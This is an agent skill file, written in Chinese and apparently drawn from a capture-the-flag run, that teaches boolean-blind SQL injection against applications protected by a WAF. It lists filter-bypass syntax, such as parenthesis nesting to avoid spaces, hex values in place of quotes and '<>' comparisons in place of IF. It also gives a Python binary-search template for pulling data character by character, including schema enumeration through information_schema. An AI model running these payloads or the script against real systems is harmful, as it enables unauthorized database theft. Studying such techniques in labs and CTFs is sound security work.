---
name: blind-sqli-waf-extraction
description: 强 WAF 环境下的布尔盲注数据提取（二分法脚本模板、可绕语法字典：无空格/无引号/禁 IF/BETWEEN 场景）。Use when injection point confirmed boolean-blind but WAF blocks common syntax（run 10089 EasyShop 实证：无空格/无引号/IF 被 ban/BETWEEN 全废，`<>` 与 OFFSET 可用）。
license: MIT
compatibility: Requires filesystem-based agent with bash and python3 (requests).
allowed-tools: Bash Read Write Edit Glob Grep
metadata:
  user-invocable: "false"
---

# 强 WAF 盲注提数（EasyShop 点赞注入实证打法）

## 第一步：可绕原语画像（系统性，勿试即弃）
逐项测并记录：`空格`→括号嵌套`(SELECT(1))`是否过；`单引号`→hex `0x..` 是否过；
`IF`→被 ban 时 `<>` 比较是否过（`(SUBSTRING(x,1,1))<('m')`）；
`LIMIT/OFFSET`→`(SELECT(x)FROM(t)LIMIT(1)OFFSET(n))` 是否过；
`UNION/AND/OR`→两侧字母数字包裹时是否仍 ban；注释符 `# -- /**/`。
**列名 canary**：`(column)` 直接布尔测存在性（id/name/price=true，zzz=false）——先确认表结构再提数。

## 第二步：二分法提数脚本（模板）
```python
# 每字符 7 次请求内定位；payload 无空格无引号（比较用 <>，值用 hex）
def char_at(pos):
    lo, hi = 0, 255
    while lo < hi:
        mid = (lo + hi) // 2
        # true_page / false_page 用两个已知响应（如 liked:true/false 或长度差）标定
        if ask(f"(ASCII((SUBSTRING((SELECT(flag)FROM(t)LIMIT(1)OFFSET(0))),{pos},1)))>({mid})"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)
```
标定 true/false 判据：响应长度差/关键字差/时间差（最稳的是结构性差异，run 10089 中
`liked:false` 对错误与空结果同响应——需用列名 canary 类的结构差异点做 oracle）。

## 提数顺序
先 `database()/table_name/column_name`（information_schema 用 `TABLE_SCHEMA<>0x..` 过滤），
再提 flag 列；全程打日志可断点续提。

## 反模式
- ❌ 手工逐字符注入——立即写脚本（手搓 45min 只出了 6 个字符的教训）。
- ❌ 在被 ban 的语法上反复变形硬试——绕不过就换原语（IF→`<>` 二分）。
